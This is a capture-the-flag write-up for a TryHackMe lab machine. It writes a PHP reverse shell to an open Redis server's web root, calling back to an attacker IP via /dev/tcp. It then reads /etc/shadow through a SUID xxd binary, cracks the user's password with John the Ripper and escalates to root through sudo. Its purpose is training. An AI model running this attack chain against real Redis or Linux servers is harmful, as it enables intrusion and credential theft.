4
```
RES:
Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
URL : https://tryhackme.com/room/res'
Difficulty : easy
Type: Semi-guided.
```

IP : 10.10.31.148


First, as always, we start with a basic nmap scan.

  `nmap -A $IP -oA ./initial `

THis only gave us the webserver port, after this will have to run a full scan.

This also shows a Redis port (see ./recon/full.nmap).

Lets see if we can connect to it with redis-cli.

`redis-cli -h $IP -p 6379`

Yes we can! Lets see if we can find any interesting information.

`KEYS *` returns nothing, meaning the redis database is empty, seems legit since it looks like a barely setup webstack.

lets try `INFO`

```
0.10.31.148:6379> INFO
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:636
run_id:4643ad44566c4249da887c0b639bd85f91ce6fc3
tcp_port:6379
uptime_in_seconds:1099
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5702777
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588008
used_memory_human:574.23K
used_memory_rss:4866048
used_memory_rss_human:4.64M
used_memory_peak:588008
used_memory_peak_human:574.23K
used_memory_peak_perc:100.00%
used_memory_overhead:541522
used_memory_startup:524536
used_memory_dataset:46486
used_memory_dataset_perc:73.24%
allocator_allocated:845696
allocator_active:1155072
allocator_resident:3391488
total_system_memory:1038798848
total_system_memory_human:990.68M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.37
allocator_frag_bytes:309376
allocator_rss_ratio:2.94
allocator_rss_bytes:2236416
rss_overhead_ratio:1.43
rss_overhead_bytes:1474560
mem_fragmentation_ratio:8.92
mem_fragmentation_bytes:4320544
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1633091630
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:11
total_commands_processed:11
instantaneous_ops_per_sec:0
total_net_input_bytes:2025
total_net_output_bytes:22745
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:18
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:15
total_writes_processed:12
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:25cdd2ed60518c8eb930a8e812f3607007f178b2
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.696000
used_cpu_user:0.488000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
```

Can we get some usefull information out of this?

I guess at least we know the username:

``
executable:/home/2/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
``

Not sure if this helps us, we start googling to see how we can exploit an open Redis instance we stumble upon this page:

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

This shows us how to inject PHP code in a file then save the database and open it with Apache, genius.

To create a reverse shell:


We know its apache2, so we can guess the default folder is used which is always /var/www/html/
```
  10.10.31.148:6379> config set dir /var/www/html/
```

Then we set the dbfilename as a .php file to later execute by calling it:

```
config set dbfilename rs.php
```

then we set a "test" value to print to the db file with a tiny PHP reverse shell as content:

```
<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.14.12.121/6666 0>&1\'"); ?>
```

Then we save the file.

```
save
```

We open up a listner on our local kali vm and wait for the reverse shell to kick in.

```
rlwrap nc -lvnp 6666
```

And now we call the file we just created.

curl "http://10.10.31.148/rs.php"

_SUCCESS!_

Now we can check the /home/vianka/ folder we found earlier to see what we can do here. and we find the first flag
```
cat /home/vianka/user.txt
```

After this, we check if we can have any privilege escalation using `linpeas.sh` as always.

We setup a local webserver with python3 in a folder we already have linpeas.sh ready.

``python3 -m http.server``

After that we navigate to /tmp/ and wget "http://ip:8000/linpeas.sh" and download linpeas. Make it executeable
`chomd +x ./linpeas.sh` and run it.

Linpeas shows us /usr/xxd as a possible escalation vector, we search GTFObins and we find it can read files :
https://gtfobins.github.io/gtfobins/xxd/

We use this to harvest the /etc/shadow file so we can decode the user password for vianka.

NOw that we have both the /etc/passwd and /etc/shadow files, we can use John the Rippper to decode it using rockyou.txt.

```
unshadow passwd shadow > unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (vianka)
1g 0:00:00:00 DONE (2021-10-01 09:54) 1.960g/s 2509p/s 2509c/s 2509C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now we have the password! we upgrade our simple webshell to a more interactive TTY with the python3 command:
`python -c 'import pty; pty.spawn("/bin/bash")'`

From here we can switch user to vianka using the password we found earlier:
su - vianka
Password: beautiful1

Now that we have local user access, the first thing i always check if sudo is incorrectly configured. and behold, vianka is allowed to sudo whatever she wants.

```
sudo -l
password:beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

This means we can simply switch user to root and get the flag:

```
sudo su -
```

and here we are, pwned. cat root.txt gives us the flag.
